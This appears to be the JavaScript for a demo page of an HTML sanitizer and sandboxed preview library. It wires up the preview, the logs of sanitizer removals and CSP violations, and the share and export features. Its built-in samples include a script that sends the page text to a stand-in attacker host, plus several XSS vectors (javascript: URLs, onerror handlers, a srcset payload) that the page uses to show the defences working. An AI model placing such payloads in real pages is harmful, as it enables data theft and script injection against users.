import {
  createPreview,
  sanitizeHtml,
  getSandboxAttribute,
  DEFAULT_MAX_BYTES,
  DEFAULT_SANDBOX_TOKENS,
} from '../dist/index.browser.js';

const samples = {
  report: `<!doctype html>
<html>
  <head>
    <title>AI Report</title>
    <style>
      body { font-family: system-ui, sans-serif; margin: 32px; color: #18202a; }
      .card { max-width: 720px; border: 1px solid #dde5ef; border-radius: 8px; padding: 20px; }
      button { padding: 8px 12px; border-radius: 6px; border: 1px solid #aeb8c6; background: white; }
      .bar { height: 18px; width: 42%; background: #1f8a70; border-radius: 999px; transition: width .25s; }
    </style>
  </head>
  <body>
    <div class="card">
      <h1>Interactive HTML report</h1>
      <p>This sample keeps inline styles and click handlers.</p>
      <div class="bar" id="bar"></div>
      <p><button onclick="document.getElementById('bar').style.width = '86%'">Update chart</button></p>
      <p><a href="https://example.com/report">Open source report</a></p>
    </div>
  </body>
</html>`,
  exfiltrate: `<!doctype html>
<html>
  <body>
    <h1>External request sample</h1>
    <p>Under the strict preset both exfiltration attempts below are blocked: the fetch by connect-src 'none', and the image pixel by img-src 'blob: data:' (no wildcard host). Switch to balanced to see the image pixel load.</p>
    <script>
      fetch('https://attacker.example/collect?data=' + encodeURIComponent(document.body.innerText));
    </script>
    <img src="https://attacker.example/pixel.png?secret=demo" alt="external pixel">
  </body>
</html>`,
  navigation: `<!doctype html>
<html>
  <body>
    <h1>Navigation sample</h1>
    <button onclick="window.location = 'https://example.com/phishing'">Try navigation</button>
    <p><a href="https://example.com/link">External link via bridge</a></p>
  </body>
</html>`,
  svg: `<!doctype html>
<html>
  <body>
    <h1>SVG payload sample</h1>
    <svg viewBox="0 0 320 120" width="320">
      <rect width="320" height="120" fill="#eef4ff"></rect>
      <circle cx="60" cy="60" r="34" fill="#1f8a70"></circle>
      <text x="112" y="68" font-size="22" fill="#17202a">SVG stays visible</text>
      <image href="javascript:alert('xss')" width="10" height="10"></image>
    </svg>
    <img src=x onerror="alert('auto event stripped')">
  </body>
</html>`,
  srcset: `<!doctype html>
<html>
  <body>
    <h1>srcset sample</h1>
    <p>The mixed candidate list is removed as one unsafe attribute.</p>
    <img alt="mixed srcset" srcset="https://safe.test/a.png 1x, javascript:alert(1) 2x">
  </body>
</html>`,
};

const source = document.querySelector('#source');
const renderButton = document.querySelector('#render');
const clearButton = document.querySelector('#clear-events');
const previewHost = document.querySelector('#preview');
const inputMeta = document.querySelector('#input-meta');
const previewMeta = document.querySelector('#preview-meta');
const runState = document.querySelector('#run-state');
const sanitizeLog = document.querySelector('#sanitize-log');
const cspLog = document.querySelector('#csp-log');
const externalLog = document.querySelector('#external-log');
const policyLog = document.querySelector('#policy-log');
const sanitizeCount = document.querySelector('#sanitize-count');
const cspCount = document.querySelector('#csp-count');
const externalCount = document.querySelector('#external-count');
const httpsProtocol = document.querySelector('#protocol-https');
const mailProtocol = document.querySelector('#protocol-mail');
const hostRule = document.querySelector('#host-rule');
const shareButton = document.querySelector('#share');
const copyReportButton = document.querySelector('#copy-report');
const sanitizedView = document.querySelector('#sanitized-view');
const changesView = document.querySelector('#changes-view');
const changesOriginal = document.querySelector('#changes-original');
const changesSanitized = document.querySelector('#changes-sanitized');
const changesSummary = document.querySelector('#changes-summary');
const editorPanel = document.querySelector('.editor-panel');

let lastHtml = '';
let lastSanitizedHtml = '';
let lastResult = null;

source.value = samples.report;

const cspEvents = [];
const externalEvents = [];
let lastSanitizeReport = null;

const preview = createPreview(previewHost, {
  csp: currentPreset(),
  externalProtocols: currentProtocols(),
  allowExternalUrl: allowExternalUrl,
  onSanitize(report) {
    lastSanitizeReport = report;
    renderSanitize(report);
  },
  onCspViolation(report) {
    cspEvents.unshift(report);
    renderCsp();
  },
  onOpenExternal(url, context) {
    externalEvents.unshift({ url, ...context });
    renderExternal();
  },
  onError(error) {
    runState.textContent = error.code || 'error';
    sanitizeLog.className = 'event-list danger';
    sanitizeLog.textContent = error.message;
  },
});

window.preview = preview;
window.externalEvents = externalEvents;

function currentPreset() {
  return document.querySelector('input[name="preset"]:checked').value;
}

function currentProtocols() {
  const protocols = [];
  if (httpsProtocol.checked) protocols.push('https:');
  if (mailProtocol.checked) protocols.push('mailto:', 'tel:');
  return protocols;
}

function allowExternalUrl(url) {
  const suffix = hostRule.value.trim();
  if (!suffix) return true;
  try {
    const parsed = new URL(url);
    return parsed.hostname === suffix || parsed.hostname.endsWith(`.${suffix}`);
  } catch {
    return false;
  }
}

function countRemoved(report) {
  return [...report.removedTags, ...report.removedAttributes, ...report.removedSchemes].reduce(
    (total, item) => total + item.count,
    0,
  );
}

function bytesOf(value) {
  return new TextEncoder().encode(value).byteLength;
}

function formatBytes(bytes) {
  if (bytes >= 1024 * 1024) {
    const value = bytes / (1024 * 1024);
    return `${Number.isInteger(value) ? value : value.toFixed(1)} MiB`;
  }
  if (bytes >= 1024) return `${(bytes / 1024).toFixed(1)} KiB`;
  return `${bytes} bytes`;
}

function updateInputMeta() {
  inputMeta.textContent = `${formatBytes(bytesOf(source.value))} / ${formatBytes(DEFAULT_MAX_BYTES)}`;
}

function setEventListState(element, emptyText, hasItems, tone = '') {
  element.className = `event-list ${hasItems ? tone : 'empty'}`.trim();
  if (!hasItems) element.textContent = emptyText;
}

function renderEventRows(element, rows, tone = '') {
  element.className = `event-list ${tone}`.trim();
  element.replaceChildren(
    ...rows.map(([label, value]) => {
      const row = document.createElement('div');
      row.className = 'event-row';

      const labelNode = document.createElement('span');
      labelNode.textContent = label;
      const valueNode = document.createElement('code');
      valueNode.textContent = value;
      row.append(labelNode, valueNode);
      return row;
    }),
  );
}

function renderSanitize(report) {
  const groups = [
    ['Tags', report.removedTags.map((item) => `${item.tag} x${item.count}`)],
    ['Attributes', report.removedAttributes.map((item) => `${item.tag}.${item.attr} x${item.count}`)],
    ['Schemes', report.removedSchemes.map((item) => `${item.scheme} x${item.count}`)],
  ];
  const rows = groups.flatMap(([label, values]) => values.map((value) => [label, value]));
  sanitizeCount.textContent = String(countRemoved(report));
  if (!rows.length) {
    setEventListState(sanitizeLog, 'No sanitizer removals.', false);
    return;
  }
  renderEventRows(sanitizeLog, rows);
}

function renderCsp() {
  cspCount.textContent = String(cspEvents.length);
  if (!cspEvents.length) {
    setEventListState(cspLog, 'No violations yet.', false);
    return;
  }
  renderEventRows(
    cspLog,
    cspEvents.slice(0, 8).map((event) => [event.effectiveDirective || 'blocked', event.blockedURI || 'inline']),
    'warning',
  );
}

function renderExternal() {
  externalCount.textContent = String(externalEvents.length);
  if (!externalEvents.length) {
    setEventListState(externalLog, 'No requests yet.', false);
    return;
  }
  renderEventRows(
    externalLog,
    externalEvents.slice(0, 8).map((event) => [event.source, event.url]),
  );
}

function renderPolicy() {
  const sandbox = getSandboxAttribute(DEFAULT_SANDBOX_TOKENS);
  renderEventRows(policyLog, [
    ['preset', currentPreset()],
    ['protocols', currentProtocols().join(' ') || 'none'],
    ['host rule', hostRule.value.trim() || 'any host'],
    ['sandbox', sandbox],
  ]);
}

function clearEvents() {
  cspEvents.length = 0;
  externalEvents.length = 0;
  renderCsp();
  renderExternal();
}

async function render() {
  clearEvents();
  runState.textContent = 'rendering';
  updateInputMeta();
  preview.updateOptions({
    csp: currentPreset(),
    externalProtocols: currentProtocols(),
    allowExternalUrl,
  });
  const started = performance.now();
  const result = await preview.render(source.value);
  const elapsed = Math.max(1, Math.round(performance.now() - started));
  const sanitized = sanitizeHtml(source.value);
  lastResult = result;
  lastHtml = result.html;
  lastSanitizedHtml = sanitized.html;
  previewMeta.textContent = `${result.encoding} / ${formatBytes(result.size)} / ${elapsed}ms`;
  runState.textContent = 'rendered';
  renderPolicy();
  updateView();
  if (lastSanitizeReport) renderSanitize(lastSanitizeReport);
}

function currentView() {
  return document.querySelector('input[name="view"]:checked').value;
}

// Toggle between the rendered sandbox preview and the exact HTML the pipeline
// produced — so users can inspect what was actually sanitized/injected, not just
// the rendered result.
function updateView() {
  const showHtml = currentView() === 'html';
  const showChanges = currentView() === 'changes';
  sanitizedView.hidden = !showHtml;
  changesView.hidden = !showChanges;
  previewHost.hidden = showHtml || showChanges;
  if (showHtml) {
    sanitizedView.querySelector('code').textContent = lastHtml || 'Render first to see the sanitized document.';
  }
  if (showChanges) renderChanges();
}

function escapeRegExp(value) {
  return value.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function appendOriginalDiff(html, report) {
  changesOriginal.replaceChildren();
  if (!report) {
    changesOriginal.textContent = 'Render first to inspect sanitizer changes.';
    return;
  }

  const removedTags = new Set(report.removedTags.map((item) => item.tag.toLowerCase()));
  const removedAttributes = report.removedAttributes.map((item) => ({
    tag: item.tag.toLowerCase(),
    attr: item.attr.toLowerCase(),
  }));
  const tagPattern = /<[^>]*>/g;
  let cursor = 0;

  for (const match of html.matchAll(tagPattern)) {
    changesOriginal.append(document.createTextNode(html.slice(cursor, match.index)));
    const token = match[0];
    const tag = token.match(/^<\/?\s*([^\s/>]+)/)?.[1]?.toLowerCase() ?? '';
    const removedAttribute = removedAttributes.some(
      (item) =>
        (item.tag === '*' || item.tag === tag) && new RegExp(`\\b${escapeRegExp(item.attr)}\\s*=`, 'i').test(token),
    );
    const tokenNode = document.createElement('span');
    tokenNode.textContent = token;
    if (removedTags.has(tag) || removedAttribute) {
      tokenNode.className = 'diff-removed';
      tokenNode.title = removedTags.has(tag) ? `Removed <${tag}> element` : 'Contains a removed attribute';
    }
    changesOriginal.append(tokenNode);
    cursor = match.index + token.length;
  }
  changesOriginal.append(document.createTextNode(html.slice(cursor)));
}

function renderChanges() {
  appendOriginalDiff(source.value, lastSanitizeReport);
  changesSanitized.textContent = lastSanitizedHtml || 'Render first to inspect sanitizer changes.';
  const removed = lastSanitizeReport ? countRemoved(lastSanitizeReport) : 0;
  changesSummary.textContent = `${removed} removal${removed === 1 ? '' : 's'}`;
}

async function copyReport() {
  if (!lastSanitizeReport || !lastResult) return;
  const report = {
    input: {
      size: lastResult.size,
      maxBytes: DEFAULT_MAX_BYTES,
      encoding: lastResult.encoding,
    },
    preset: currentPreset(),
    sanitizeReport: lastSanitizeReport,
  };
  try {
    await navigator.clipboard.writeText(JSON.stringify(report, null, 2));
    copyReportButton.textContent = 'Copied';
  } catch {
    copyReportButton.textContent = 'Copy failed';
  }
  setTimeout(() => {
    copyReportButton.textContent = 'Copy report';
  }, 1500);
}

// --- Shareable URL: encode the input + preset into the location hash ---
function encodeState(state) {
  const bytes = new TextEncoder().encode(JSON.stringify(state));
  let binary = '';
  for (const byte of bytes) binary += String.fromCharCode(byte);
  return btoa(binary);
}

function decodeState(encoded) {
  const binary = atob(encoded);
  const bytes = Uint8Array.from(binary, (char) => char.charCodeAt(0));
  return JSON.parse(new TextDecoder().decode(bytes));
}

async function share() {
  const encoded = encodeState({ preset: currentPreset(), src: source.value });
  const url = `${location.origin}${location.pathname}#s=${encoded}`;
  history.replaceState(null, '', `#s=${encoded}`);
  try {
    await navigator.clipboard.writeText(url);
    shareButton.textContent = 'Copied!';
  } catch {
    shareButton.textContent = 'URL updated';
  }
  setTimeout(() => {
    shareButton.textContent = 'Share';
  }, 1500);
}

function restoreFromHash() {
  const match = location.hash.match(/[#&]s=([^&]+)/);
  if (!match) return false;
  try {
    const state = decodeState(match[1]);
    if (typeof state.src === 'string') source.value = state.src;
    const presetInput = document.querySelector(`input[name="preset"][value="${state.preset}"]`);
    if (presetInput) presetInput.checked = true;
    return true;
  } catch {
    return false;
  }
}

// --- Drag & drop an HTML file into the editor ---
function readDroppedFile(file) {
  if (!file) return;
  const reader = new FileReader();
  reader.onload = () => {
    source.value = String(reader.result || '');
    updateInputMeta();
    render();
  };
  reader.readAsText(file);
}

function selectSample(name) {
  source.value = samples[name];
  for (const button of document.querySelectorAll('[data-sample]')) {
    button.classList.toggle('active', button.dataset.sample === name);
  }
  render();
}

renderButton.addEventListener('click', render);
clearButton.addEventListener('click', clearEvents);
source.addEventListener('input', () => {
  updateInputMeta();
});
hostRule.addEventListener('input', renderPolicy);
httpsProtocol.addEventListener('change', render);
mailProtocol.addEventListener('change', render);

for (const input of document.querySelectorAll('input[name="preset"]')) {
  input.addEventListener('change', render);
}

for (const button of document.querySelectorAll('[data-sample]')) {
  button.addEventListener('click', () => selectSample(button.dataset.sample));
}

for (const input of document.querySelectorAll('input[name="view"]')) {
  input.addEventListener('change', updateView);
}

shareButton.addEventListener('click', share);
copyReportButton.addEventListener('click', copyReport);

for (const type of ['dragenter', 'dragover']) {
  editorPanel.addEventListener(type, (event) => {
    event.preventDefault();
    editorPanel.classList.add('dropping');
  });
}
for (const type of ['dragleave', 'drop']) {
  editorPanel.addEventListener(type, (event) => {
    event.preventDefault();
    editorPanel.classList.remove('dropping');
  });
}
editorPanel.addEventListener('drop', (event) => readDroppedFile(event.dataTransfer?.files?.[0]));

// Restore a shared link if present, otherwise start from the report sample.
if (restoreFromHash()) {
  render();
} else {
  selectSample('report');
}
